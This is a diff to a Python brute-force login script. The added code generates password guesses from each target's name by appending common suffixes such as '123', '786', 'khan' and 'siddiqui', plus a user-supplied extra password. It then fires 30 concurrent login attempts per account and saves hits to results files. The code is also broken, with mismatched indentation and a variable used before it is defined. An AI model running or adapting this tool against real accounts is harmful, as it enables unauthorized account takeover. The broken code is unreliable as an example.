@@ -72,10 +72,36 @@ def brute(password):
 			
 def search():
 	global password
-	passwords = open(passwordlist,"r")
+	passwords = open(listpass,"r")
 	for password in passwords:
 		password = password.replace("\n","")
 		brute(password)
+	print
+	expass = input("\033[1;32mEXTRA PASSWORD\033[0m >>> ")
+ print("\033[1;34mresult will be saved in results-succes.txt and results-check.txt\033[0m ")
+                with ThreadPoolExecutor(max_workers=30) as ex:
+                        for user in username:
+                                users = user.split('|')
+                                ss = users[0].split(' ')
+                                for x in ss:
+                                        listpass = [
+                                                str(x) + '123',
+                                                str(x) + '786',
+                                                str(x) + '12345',
+                                                str(x) + '@123',
+                                                str(x) + '12',
+                                                str(x) + 'khan',
+                                                str(x) + '1234',
+                                                str(x) + 'siddiqui',
+                                                str(x) + 'hussain',
+                                                str(x) + '111',
+                                                str(x) + '2020',
+                                                str(x) + '10',
+                                                str(x)
+                                                ]
+                                        listpass.append(expass)
+                                        for passw in set(listpass):
+                                                ex.submit(login,(users[1]),(passw))
 
 		
 #welcome 
